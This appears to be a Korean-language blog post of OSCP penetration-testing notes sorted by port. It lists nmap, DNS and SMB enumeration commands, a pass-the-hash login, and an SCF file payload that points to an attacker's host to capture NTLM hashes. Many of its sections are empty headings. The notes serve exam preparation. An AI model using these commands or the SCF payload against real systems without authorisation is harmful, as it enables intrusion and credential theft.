---
layout: post
title: OSCPv2
subtitle: OSCPv2 포트별 정리
author: g3rm
categories: 
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
sidebar:
---

# Port Scan
```shell
# basic
sudo nmap -sC -sV -Pn ip -oN ip

# all port 
sudo nmap -sC -sV -Pn -p- ip -oN ip_allport

# udp
sudo nmap -sC -sV -U -Pn ip -oN ip_udp

# nse scan
sudo nmap --script-updatedb
sudo nmap -sC -sV -Pn --script script -p port ip

# In Window
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("ip", $_)) "TCP port $_ is open"} 2>$null
```

# 21 FTP
```shell
# anonymous:anonymous & ftp:ftp
ftp anonymous@ip
```
# 22 SSH
```shell
# Version Vuln Scan
# 
```

# 25, 465, 587, 2525 SMTP
```shell
# user 확인
nc -nv <ip> 25
```

# 53 DNS
```shell
# IP 찾기
host <domain>

# A레코드 검색
host -t mx <domain>
nslookup mail.megacorptwo.com # in Window

# TXT레코드 검색
host -t txt <domain>
nslookup -type=TXT <domain> <DNS_IP> # in Window

# subdomain 검색 : /usr/share/seclists 
# 없을경우 sudo apt install seclists
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
for ip in $(seq 200 254); do host 000.000.000.$ip; done | grep -v "not found"

# dnsrecon / options : std, brt
dnsrecon -d <domain> -t <options> -D <wordlist>
```

# 80, 443 HTTP

# 88 Kerberos

# 161 SNMP

# 389 LDAP

# 445 SMB
```shell
# 디스크 확인
smbclient //<ip>/<Folder 명>
net view \\<AD_domain> /all # in Window

# NTML hash 사용
smbclient \\\\192.168.50.212\\secrets -U <user> --pw-nt-hash <hash>

# 공유 폴더 확인
crackmapexec smb 10.129.157.36 -u '' -p '' --shares
crackmapexec smb 10.129.157.36 -u '' -p '' --users
crackmapexec smb 10.129.157.36 -u '' -p '' --rid-brute

# 재귀로 검색
crackmapexec smb 10.129.157.36 -u '' -p '' --spider <폴더명> --regex .

# 파일 얻기
get file.ext

# writable 확인
## mount
mount -t cifs -o rw,username=guest,password= '//<ip>/<폴더명>' /mnt
## writable.sh
#!/bin/bash
list=$(find /mnt -type d)
for d in $list
do
	touch $d/x 2>/dev/null
	if [ $? -eq 0 ]
	then
		echo $d " is writable"
	fi
done
## scf attack
### hash.scf
[Shell] Command=2
IconFile=\\<kali_ip>\share\pwn.ico 
[Taskbar] 
Command=ToggleDesktop
```

# 1433 MSSQL

# 3306 MYSQL

# 3389 RDP

# 5985, 5986 WINRM

# Credencial

# Windows

# Linux

# Tunneling

# Git

# Python

# Jenkins

# Metasploit

